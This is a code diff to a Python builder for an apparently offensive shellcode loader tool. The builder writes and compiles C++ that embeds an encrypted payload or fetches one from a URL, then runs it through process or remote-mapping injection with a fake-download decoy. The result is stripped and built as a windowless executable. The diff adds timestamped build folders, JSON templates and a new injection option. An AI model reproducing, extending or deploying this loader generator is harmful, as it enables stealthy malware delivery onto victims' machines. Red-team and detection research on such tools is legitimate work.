@@ -1,38 +1,39 @@
 import os
 import time
+import json
 from Cast.cli import *
 from Cast.local_load import *
 from Cast.encryptor import *
 
-def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
-    f = open ("Build\\main.cpp", "a")
+def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
+    f = open (f"{build_folder}\\main.cpp", "a")
     f.write(f"""
 #include <iostream>
 #include <string>
 #include <Windows.h>
 #include <stdio.h>
 #include <wininet.h>
+#include "../../Spells/UtilitySpells/FetchFromURL.h"
 
 """)
     if Decoy != "null":
         f.write(f"""\n
-#include "../Spells/UtilitySpells/FakeDownload.h"
-#include "../Spells/UtilitySpells/FetchFromURL.h"
+#include "../../Spells/UtilitySpells/FakeDownload.h"
 """)   
     
     if Encryption != "null":
         f.write(f"""\n
-#include "../Spells/EncryptionSpells/{Encryption}"
-#include "../Spells/EncryptionSpells/KeyBrute.h"
+#include "../../Spells/EncryptionSpells/{Encryption}"
+#include "../../Spells/EncryptionSpells/KeyBrute.h"
 """)
         
     if Enumeration != "null":
         f.write(f"""\n
-#include "../Spells/{Enumeration}"
+#include "../../Spells/{Enumeration}"
 """)
         
     f.write(f"""\n
-#include "../Spells/{Loader}"
+#include "../../Spells/{Loader}"
 """)
     if Payload != "null" :
         Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
@@ -84,7 +85,7 @@ int main()
 
     if Url != "null":
         f.write(f"""\n
-    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
+    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){{
         printf("Failed to fetch payload");
         return 0;
     }}
@@ -130,7 +131,8 @@ int main()
 
     f.close()
     time.sleep(2)
-    build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
+    #build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
+    build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} {build_folder}\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
     os.system(f"strip -o  {Path}.exe {Path}.exe")
     return build
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-DNO_WINTERNL', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -168,6 +170,29 @@ def restore_header_file(Enumeration, Loader, ApiMode):
     with open(f"Spells/{Loader}", "w") as file:
         file.write(content)
 
+def read_from_template(Path):
+    Path = os.path.join(Path, "template.json")
+    with open("template.json", "r") as file:
+        data = json.load(file)
+    return data
+
+
+
+def build_template(Path, Payload, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
+    Path = os.path.join(Path, "template.json")
+    data = {
+        "Payload_Path": Payload,
+        "Url": Url,
+        "Encryption": Encryption,
+        "Enumeration": Enumeration,
+        "ProcessName": ProcessName,
+        "Loader": Loader,
+        "Decoy": Decoy
+    }
+    with open(Path, "w") as file:
+        json.dump(data, file, indent=4)
+
+
 def main():
 
     Payload_Location = set_payload_location()
@@ -198,7 +223,7 @@ def main():
         ProcessName = "null"
     else:
         Loader = set_remote_loader_type()
-        if Loader == "RemoteExecutionSpells/RemoteInjection.h":
+        if Loader == "RemoteExecutionSpells/RemoteInjection.h" or Loader == "RemoteExecutionSpells/RemoteMappingInjection.h":
             if get_handle_type() == "1":
                 Enumeration = set_proc_creation_type()
             else:
@@ -228,12 +253,28 @@ def main():
     if Name == "":
         Name = "FireBall"
 
-    Path = os.path.join(Path, Name)
+    timestamp = time.strftime("%Y%m%d_%H%M%S")
+    build_folder = os.path.join(Path, timestamp)
+    os.makedirs(build_folder, exist_ok=True)
+    Path = os.path.join(build_folder, Name)
 
-    if not build(Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
-        print(f"\nLoader Built Successfully!\nAt {Path}\n\nHave Fun! :)")
+    print("""
+[+] Casting... 
+
+    ╰( ⁰ ਊ ⁰ )━━☆ﾟ.*･｡ﾟ \n""")
+
+    if not build_template(build_folder, Payload, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
+        print(f"\n[+] Template saved at {build_folder}")
     else:
-        print(f"\nFailed to build loader :(")
+        print(f"\n[!] Failed to save template at {build_folder}")
+
+    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
+        print(f"""
+[+] Loader Built Successfully! At {build_folder}
+    
+    Have Fun! (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧\n""")
+    else:
+        print(f"\n[!]Failed to build loader (╯°□°）╯︵ ┻━┻\n")
     
     restore_header_file(Enumeration, Loader, ApiMode)
     if Payload_Location == "1":
